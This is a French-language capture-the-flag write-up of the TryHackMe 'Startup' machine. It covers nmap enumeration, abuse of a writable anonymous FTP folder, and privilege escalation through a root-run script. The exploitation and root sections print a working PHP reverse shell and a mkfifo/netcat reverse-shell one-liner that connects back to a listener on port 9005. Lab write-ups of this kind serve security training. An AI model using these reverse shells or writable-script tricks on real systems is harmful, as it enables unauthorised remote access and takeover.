---
title: "[TryHackMe] Startup"
date: 2025-11-19 00:00:00 +0800
categories: [THM, Easy]
tags: [PHP, Script]
toc: true
image: assets/img/posts/Startup/Startup.png
---

- **Target**: Linux üêß / Web üåê
- **Difficulty**: Easy üü¢
- **Scope**: HTTP / FTP
- **Exploit** : PHP reverse shell / script shell

---

# Enumeration

Premier scan pour d√©couvrir les ports.
```bash
nmap -p- -T4 10.10.168.83 
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
Deuxi√®me scan cibl√© sur les ports d√©couverts en ajoutant `-sV` pour la version des services et `-sC` pour les scripts de base :
```bash
nmap -sV -sC -p 21,22,80 10.10.168.83
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.94.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP
On d√©couvre un acc√®s `Anonymous FTP login allowed`
et des droits d'√©criture sur le dossier FTP `drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp`

## SSH
Aucune information importante.

## HTTP
On obtient une simple page.
<img src="assets/img/posts/Startup/Site.png">

Avec Gobuster, on d√©couvre le r√©pertoire /files.
<img src="assets/img/posts/Startup/Gobuster.png">

Ce r√©pertoire contient une image `important.png`, un fichier texte `notice.txt` et le Dossier `Ftp` sur lequel nous avons les droits d'√©criture (le .jpg et le .txt n'apportent rien).
<img src="assets/img/posts/Startup/Files.png">



# Exploitation
Nous allons exploiter l'acc√®s Anonymous du serveur FTP ainsi que le droit d'√©criture sur le dossier FTP.

Je vais utiliser <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer">https://www.revshells.com/</a> pour g√©n√©rer un payload adapt√©.
<img src="assets/img/posts/Startup/Payload.png">

```bash                      
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 9005 >/tmp/f");
?>
```

Et ouvrir un listener sur le port 9005
```bash
pwncat-cs -lp 9005 
```

Nous pouvons maintenant nous connecter sur le service FTP et d√©poser notre payload `shell.php` dans le dossier FTP.
<img src="assets/img/posts/Startup/FTP.png">

Nous pouvons retourner sur le site dans le r√©pertoire /files/ftp, constater la pr√©sence de notre payload, v√©rifier que le listener est bien en place, et cliquer sur notre shell.php.
<img src="assets/img/posts/Startup/Shell.png">

# Premier Flag 
Le premier flag se trouve dans Recipe.txt.
<img src="assets/img/posts/Startup/Flag1.png">

# user Permissions
Nous pouvons d√©couvrir un compte utilisateur `lennie` ainsi qu'un dossier `Incidents` qui contient un fichier `suspicious.pcapng`.
<img src="assets/img/posts/Startup/Incidents.png">

On r√©cup√®re ce fichier et l'analyser avec `wireshark`.
Gr√¢ce √† la lecture en stream, on d√©couvre le password de Lennie.

<img src="assets/img/posts/Startup/password.png">

Nous pouvons nous connecter et d√©couvrir le deuxi√®me flag `user.txt`.

# Root Permissions
En plus du flag `user.txt`, on trouve un dossier scripts. 

<img src="assets/img/posts/Startup/User.png">

En naviguant dedans, on d√©couvre un script `planner.sh` qui ex√©cute un autre script `print.sh`.
Apr√®s v√©rification, j'ai les droits d'√©criture sur `print.sh` et on peut voir que le script est ex√©cut√© par l'utilisateur `root`.
Je d√©cide donc de r√©utiliser mon reverse shell‚ÄØ:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 9005 >/tmp/f`
J'ouvre un listener, j'ajoute mon shell √† la fin de `print.sh` et l√†, j'obtiens l'acc√®s root ainsi que le dernier flag.


<img src="assets/img/posts/Startup/Print.png">
<img src="assets/img/posts/Startup/Root.png">